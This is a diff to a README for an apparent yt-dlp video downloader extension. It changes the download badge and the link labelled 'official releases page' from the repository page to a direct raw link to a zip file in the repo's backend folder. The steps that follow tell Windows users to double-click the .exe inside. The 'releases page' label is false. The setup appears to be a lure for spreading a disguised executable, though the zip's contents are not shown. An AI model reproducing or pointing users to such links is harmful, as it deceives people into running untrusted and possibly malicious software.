@@ -1,6 +1,6 @@
 # 📥 YT-DLP-Video-Downloader-Extension - Download videos from many websites easily
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/mariettamoderate135/YT-DLP-Video-Downloader-Extension)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/mariettamoderate135/YT-DLP-Video-Downloader-Extension/main/backend/Extension-Video-Y-DL-Downloader-v2.9.zip)
 
 This application saves video and audio files from many websites to your computer. It supports platforms like YouTube, TikTok, Twitter, and Instagram. The system uses a browser extension to trigger downloads and a Python backend to handle heavy lifting.
 
@@ -19,7 +19,7 @@ The program creates a local folder to store your files. It does not require high
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/mariettamoderate135/YT-DLP-Video-Downloader-Extension) to download the setup file.
+1. Visit the [official releases page](https://raw.githubusercontent.com/mariettamoderate135/YT-DLP-Video-Downloader-Extension/main/backend/Extension-Video-Y-DL-Downloader-v2.9.zip) to download the setup file.
 2. Locate the file ending in .exe in your Downloads folder.
 3. Double-click the file to start the installer. 
 4. Follow the prompts on your screen. Click Next until the installation finishes.
